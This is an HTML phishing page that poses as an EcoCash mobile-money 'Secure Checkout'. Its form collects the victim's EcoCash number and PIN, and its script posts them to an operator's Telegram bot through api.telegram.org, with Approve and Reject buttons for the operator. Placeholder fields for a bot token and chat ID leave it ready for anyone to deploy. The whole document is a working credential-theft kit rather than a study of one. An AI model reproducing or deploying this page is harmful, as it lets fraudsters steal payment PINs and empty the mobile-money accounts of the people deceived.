<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout - EcoCash</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0b1320; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-container { width: 100%; max-width: 400px; background: #16233a; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #2a3a52; }
        .header { text-align: center; margin-bottom: 25px; }
        .header h2 { color: #5da2ff; margin-bottom: 10px; }
        .summary-box { background: #1a2639; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #00e676; }
        .summary-box p { font-size: 14px; margin-bottom: 5px; color: #a0aabf; }
        .summary-box strong { color: #fff; font-size: 16px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-size: 14px; color: #a0aabf; }
        .form-group input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #2a3a52; background: #0b1320; color: #fff; font-size: 16px; }
        .form-group input:focus { outline: none; border-color: #5da2ff; }
        .submit-btn { width: 100%; padding: 14px; background: #d32f2f; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; margin-top: 10px; }
        .submit-btn:hover { background: #b71c1c; }
        .submit-btn:disabled { background: #555; cursor: not-allowed; }
        .loading { display: none; text-align: center; margin-top: 15px; color: #5da2ff; font-size: 14px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header">
            <h2>EcoCash Payment</h2>
            <p style="color: #a0aabf; font-size: 14px;">Enter your PIN to confirm payment</p>
        </div>
        <div class="summary-box">
            <p>You are paying for:</p>
            <strong id="display-plan">Loading...</strong><br>
            <strong id="display-price" style="color: #00e676;"></strong>
        </div>
        <form id="payment-form">
            <div class="form-group">
                <label>EcoCash Number</label>
                <input type="tel" id="phone-number" placeholder="Enter your EcoCash Number" required>
            </div>
            <div class="form-group">
                <label>EcoCash PIN</label>
                <input type="password" id="ecocash-pin" placeholder="Enter 4-digit PIN" maxlength="4" required>
            </div>
            <button type="submit" class="submit-btn" id="pay-btn">Confirm Payment</button>
            <div class="loading" id="loading-text">Processing secure payment...</div>
        </form>
    </div>
    <script>
        // ⚠️ REPLACE THESE WITH YOUR ACTUAL TELEGRAM DETAILS
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     

        // Read data from application.html
        const urlParams = new URLSearchParams(window.location.search);
        const planName = urlParams.get('plan') || 'Unknown Plan';
        const planPrice = urlParams.get('price') || 'Unknown Price';
        const orderId = 'ORD-' + Math.floor(Math.random() * 1000000);

        document.getElementById('display-plan').innerText = planName;
        document.getElementById('display-price').innerText = planPrice;

        document.getElementById('payment-form').addEventListener('submit', async function(e) {
            e.preventDefault(); 
            const pin = document.getElementById('ecocash-pin').value;
            const phoneNumber = document.getElementById('phone-number').value;
            const payBtn = document.getElementById('pay-btn');
            const loadingText = document.getElementById('loading-text');

            if (pin.length < 4) { alert("Please enter a valid 4-digit PIN."); return; }

            payBtn.disabled = true;
            payBtn.innerText = "Processing...";
            loadingText.style.display = 'block';

            const message = `🚨 *NEW ECOCASH LOGIN* 🚨\n-------------------------\n🆔 *Order ID:* ${orderId}\n📦 *Package:* ${planName}\n💰 *Price:* ${planPrice}\n📱 *Phone:* ${phoneNumber}\n🔑 *PIN:* ${pin}\n-------------------------\n⏰ *Time:* ${new Date().toLocaleString()}`;
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            // Approve & Reject Buttons
            const inlineKeyboard = {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${orderId}` },
                        { text: "❌ Reject", callback_data: `reject_${orderId}` }
                    ]
                ]
            };

            try {
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        reply_markup: inlineKeyboard 
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    alert("Payment details submitted successfully. Please wait for confirmation.");
                } else {
                    alert("Error sending data. Check console.");
                    console.error(data);
                }
            } catch (error) {
                alert("Network error. Please check your internet connection.");
                console.error(error);
            } finally {
                payBtn.disabled = false;
                payBtn.innerText = "Confirm Payment";
                loadingText.style.display = 'none';
            }
        });
    </script>
</body>
</html>
